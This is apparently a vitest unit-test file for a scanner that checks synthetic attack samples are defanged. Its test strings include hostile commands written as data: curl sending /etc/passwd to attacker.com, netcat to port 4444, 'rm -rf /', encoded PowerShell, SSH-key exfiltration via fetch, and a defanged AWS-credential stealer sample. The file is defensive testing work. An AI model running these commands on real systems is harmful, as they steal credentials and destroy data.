/**
 * Unit tests for scanForDefangViolations. Every category (network, exec, encoded-exec,
 * cred-exfil) has both a positive (should-flag) and a negative (should-pass) case, so the
 * guard's semantics are pinned by the specification, not by the implementation.
 */

import { describe, it, expect } from 'vitest';
import { scanForDefangViolations } from '../../src/defang/index.js';

describe('scanForDefangViolations — network', () => {
  it('passes for reserved TLDs (.invalid, .test, .example, .localhost)', () => {
    const s = 'fetch("https://payload.invalid/steal"); http://mycorp.test/report; noop.example';
    expect(scanForDefangViolations(s).clean).toBe(true);
  });

  it('passes for RFC 2606 example.com / example.org / example.net', () => {
    expect(scanForDefangViolations('https://example.com/x').clean).toBe(true);
    expect(scanForDefangViolations('https://example.org/y').clean).toBe(true);
    expect(scanForDefangViolations('https://example.net/z').clean).toBe(true);
  });

  it('passes for loopback IPs (127.x, 0.x, ::1)', () => {
    expect(scanForDefangViolations('nc 127.0.0.1 80').clean).toBe(true);
    expect(scanForDefangViolations('bind 0.0.0.0:8080').clean).toBe(true);
  });

  it('flags a real-looking domain', () => {
    const r = scanForDefangViolations('exfiltrate to https://attacker.com/steal');
    expect(r.clean).toBe(false);
    expect(r.violations.some((v) => v.category === 'network' && /attacker\.com/.test(v.match))).toBe(true);
  });

  it('flags a real-looking IPv4', () => {
    const r = scanForDefangViolations('curl 8.8.8.8/api');
    expect(r.clean).toBe(false);
    expect(r.violations.some((v) => v.category === 'network' && v.match === '8.8.8.8')).toBe(true);
  });

  it('reports 1-based line numbers for each violation', () => {
    const s = 'line1\nline2 https://evil.com/here\nline3';
    const r = scanForDefangViolations(s);
    expect(r.clean).toBe(false);
    const netViol = r.violations.find((v) => v.category === 'network');
    expect(netViol?.line).toBe(2);
  });
});

describe('scanForDefangViolations — exec', () => {
  it('passes for echo/true/false inside bash -c', () => {
    expect(scanForDefangViolations('bash -c "echo hello"').clean).toBe(true);
    expect(scanForDefangViolations('sh -c "true"').clean).toBe(true);
    expect(scanForDefangViolations('bash -c false').clean).toBe(true);
  });

  it('flags curl with a real URL', () => {
    const r = scanForDefangViolations('curl https://attacker.com/x -d @/etc/passwd');
    expect(r.clean).toBe(false);
    expect(r.violations.some((v) => v.category === 'exec' && /curl/.test(v.match))).toBe(true);
  });

  it('flags a bash -c with a non-allowed body', () => {
    const r = scanForDefangViolations('bash -c "rm -rf /"');
    expect(r.clean).toBe(false);
    expect(r.violations.some((v) => v.category === 'exec')).toBe(true);
  });

  it('flags nc (netcat) usage', () => {
    const r = scanForDefangViolations('nc attacker.com 4444');
    expect(r.clean).toBe(false);
    // Either 'exec' (nc pattern) or 'network' (attacker.com) is fine — both are correct flags.
    expect(r.violations.length).toBeGreaterThan(0);
  });

  it('flags powershell', () => {
    const r = scanForDefangViolations('powershell.exe -enc AAAA');
    expect(r.clean).toBe(false);
    expect(r.violations.some((v) => v.category === 'exec' && /powershell/.test(v.match))).toBe(true);
  });
});

describe('scanForDefangViolations — encoded-exec', () => {
  it('passes for a lone base64 blob (no decode-and-run in sight)', () => {
    // Images embedded as base64 in docs / test fixtures are common and legitimate.
    const b64 = 'A'.repeat(200);
    expect(scanForDefangViolations(`avatar: ${b64}`).clean).toBe(true);
  });

  it('flags base64 + atob() together', () => {
    const b64 = 'A'.repeat(120);
    const r = scanForDefangViolations(`atob("${b64}")`);
    expect(r.clean).toBe(false);
    expect(r.violations.some((v) => v.category === 'encoded-exec')).toBe(true);
  });

  it('flags base64 + Buffer.from(..., "base64") together', () => {
    const b64 = 'B'.repeat(120);
    const r = scanForDefangViolations(`Buffer.from("${b64}", "base64")`);
    expect(r.clean).toBe(false);
  });

  it('flags long hex + new Function together', () => {
    const hex = 'ab'.repeat(50); // 100 hex chars, not a SHA-common length
    const r = scanForDefangViolations(`new Function(fromHex("${hex}"))`);
    expect(r.clean).toBe(false);
    expect(r.violations.some((v) => v.category === 'encoded-exec')).toBe(true);
  });

  it('does not flag SHA-shaped hex (40/64/128 chars) even alongside a decoder', () => {
    const sha256 = 'a'.repeat(64);
    // Even with an eval nearby, a fixed-length SHA-like hex is likely a hash reference.
    const r = scanForDefangViolations(`hash: ${sha256}; if (eval(x)) {}`);
    // Any encoded-exec violation should exclude the SHA-length hex.
    const encHits = r.violations.filter((v) => v.category === 'encoded-exec');
    expect(encHits.every((v) => !v.match.includes(sha256))).toBe(true);
  });
});

describe('scanForDefangViolations — cred-exfil', () => {
  it('passes for a credential path alone (no exfil target)', () => {
    // A detector fixture may need to reference ~/.ssh/id_rsa to be recognized.
    expect(scanForDefangViolations('const p = "~/.ssh/id_rsa"').clean).toBe(true);
  });

  it('flags credential path + real network endpoint together', () => {
    const r = scanForDefangViolations(
      'read("~/.ssh/id_rsa"); fetch("https://attacker.com/steal")',
    );
    expect(r.clean).toBe(false);
    expect(r.violations.some((v) => v.category === 'cred-exfil')).toBe(true);
  });

  it('does not flag credential path + reserved endpoint', () => {
    const r = scanForDefangViolations(
      'read("~/.ssh/id_rsa"); fetch("https://attacker.invalid/steal")',
    );
    // No cred-exfil (endpoint is reserved), no network (endpoint is reserved).
    expect(r.violations.filter((v) => v.category === 'cred-exfil')).toEqual([]);
    expect(r.violations.filter((v) => v.category === 'network')).toEqual([]);
  });
});

describe('scanForDefangViolations — cleanliness invariants', () => {
  it('empty content is clean', () => {
    expect(scanForDefangViolations('').clean).toBe(true);
  });

  it('plain prose is clean', () => {
    expect(
      scanForDefangViolations('This is a normal README describing what our fixture demonstrates.')
        .clean,
    ).toBe(true);
  });

  it('a maximally-defanged synthetic attack sample is clean', () => {
    const sample = `
// Synthetic post-install exfil, defanged.
const { exec } = require('child_process');
const fs = require('fs');
const creds = fs.readFileSync('~/.aws/credentials', 'utf8');
fetch('https://drop.invalid/collect', {
  method: 'POST',
  body: creds,
});
exec('bash -c "echo defanged"');
`;
    expect(scanForDefangViolations(sample).clean).toBe(true);
  });
});
